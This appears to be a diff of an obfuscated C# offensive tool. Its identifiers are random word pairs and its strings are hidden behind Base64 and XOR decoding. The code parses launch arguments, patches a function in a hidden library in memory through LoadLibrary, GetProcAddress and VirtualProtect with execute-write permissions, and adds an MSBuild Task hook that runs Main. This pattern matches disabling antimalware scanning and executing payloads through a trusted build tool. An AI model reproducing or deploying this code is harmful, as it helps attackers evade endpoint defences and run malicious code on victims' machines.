+                            LonglinerPlesiomorphic = Encoding.UTF8.GetString(Convert.FromBase64String(RewithdrawalInnocently));
+                        else
+                            LonglinerPlesiomorphic = RewithdrawalInnocently;
+                    }
+                    Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("D0ozRyIMEBotFRUaHghPNjw0VQk6AhweFh0WDHQHCB0RHRZOBhUcAjNBBQIfSVQTZBhG"), "TangfishTeaspoonsful")), LonglinerPlesiomorphic);
+                }
+                if (argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("Yx8CHz0="), "NockUnmarred")) || argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("fkUVDRgr"), "ShellCubicontravariant")))
+                {
+                    int ThunderpealBagworms = Array.IndexOf(args, argument) + 1;
+                    if (ThunderpealBagworms < args.Length)
+                    {
+                        string SubfalciformSomniferous = args[ThunderpealBagworms];
+                        if (LabeledFordeal)
+                            MeteoroliticCheilodipteridae = Encoding.UTF8.GetString(Convert.FromBase64String(SubfalciformSomniferous));
+                        else
+                            MeteoroliticCheilodipteridae = SubfalciformSomniferous;
+                    }
+                }
+                if (argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("eA8BBho="), "UnsailedNomarchies")) || argument.ToLower() == Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("f0IOBg8c"), "RootholdPeeler")))
+                {
+                    int DefisLovability = Array.IndexOf(args, argument) + 1;
+                    int DisoccidentSyllogize = args.Length - DefisLovability;
+                    DeprecationsOverrunningly = new String[DisoccidentSyllogize];
+                    for (int i = 0; i < DisoccidentSyllogize; i++)
+                    {
+                        string SubfalciformSomniferousArgs = args[DefisLovability + i];
+                        if (LabeledFordeal)
+                            DeprecationsOverrunningly[i] = Encoding.UTF8.GetString(Convert.FromBase64String(SubfalciformSomniferousArgs));
+                        else
+                            DeprecationsOverrunningly[i] = SubfalciformSomniferousArgs;
+                    }
+                }
+            }
+            if (string.IsNullOrEmpty(MeteoroliticCheilodipteridae))
+            {
+                NosepieceGazeless();
+                Environment.Exit(0);
+            }
+            MalaiseIndrawing(MeteoroliticCheilodipteridae, DeprecationsOverrunningly, BenedickUnlobed, LonglinerPlesiomorphic, PurifiesLogomachic);
+            Environment.Exit(0);
+        }
+    }
+	private static void ReicingManyatta()
+    {
+        var UpdatersPreconfined = FootmanMatutinely();
+        uint ProtosaurianPharyngological;
+        var SupercolossallySphagnaceous = LoadLibrary(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("PR0JBQBHCRkB"), "SimilimumRefresher")));
+        var MicrophysicallyAbterminal = GetProcAddress(SupercolossallySphagnaceous, Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("BBoDLAUAHBUaGwQZCg=="), "AntiseraMimmouthedness")));
+        if (VirtualProtect(MicrophysicallyAbterminal, (UIntPtr)UpdatersPreconfined.Length, 0x40, out ProtosaurianPharyngological))
+        {
+            Marshal.Copy(UpdatersPreconfined, 0, MicrophysicallyAbterminal, UpdatersPreconfined.Length);
+            Console.WriteLine(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("E0Q6VDoQCg0CIRYKFBkCHUUHBwYIJwQCEEkgPTlG"), "HogtieingRelaundering")));
+        }
+    }
+	private static byte[] FootmanMatutinely()
+    {
+        if (!AngiotenosisEndaortitis())
+            return Convert.FromBase64String(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("JQk3NQ=="), "RaftsmanReallots")));
+        return Convert.FromBase64String(Encoding.UTF8.GetString(PalaeobotanicallySelaginella(Convert.FromBase64String("NhVSTw=="), "AbordSheltering")));
+    }
+	private static byte[] OversplashRelitigation(string RadioisotopeSportswriter, FileMode FerrihemoglobinLunatical)
+    {
+        byte[] HeptamethyleneUndiurnal = null;
+        using (FileStream fs = new FileStream(RadioisotopeSportswriter, FerrihemoglobinLunatical, FileAccess.Read))
+        {
+            HeptamethyleneUndiurnal = new byte[fs.Length];
+            fs.Read(HeptamethyleneUndiurnal, 0, (int)fs.Length);
+        }
+        return HeptamethyleneUndiurnal;
+    }
+	private static bool ZoanthodemicEscadrilles(ConsoleKey LongsomenessEpibranchial)
+    {
+        if (LongsomenessEpibranchial == ConsoleKey.X)
+            Environment.Exit(0);
+        return (LongsomenessEpibranchial == ConsoleKey.Y);
+    }
+	private static Type PardiAuroral(MethodInfo SoftsBallistic)
+    {
+        return SoftsBallistic.ReflectedType;
     }
 	    
 	     //This is for MSBuild later
@@ -280,7 +262,7 @@ using System;using System.IO;using System.Net;using System.Text;using System
 	    {
 	        public override bool Execute()
 	        {
-	            AmphibologicalRhynchocoela.Main(new string[] { });
+	            SoullikePrincelier.Main(new string[] { });
 	            return true;
 	        }
 	    }
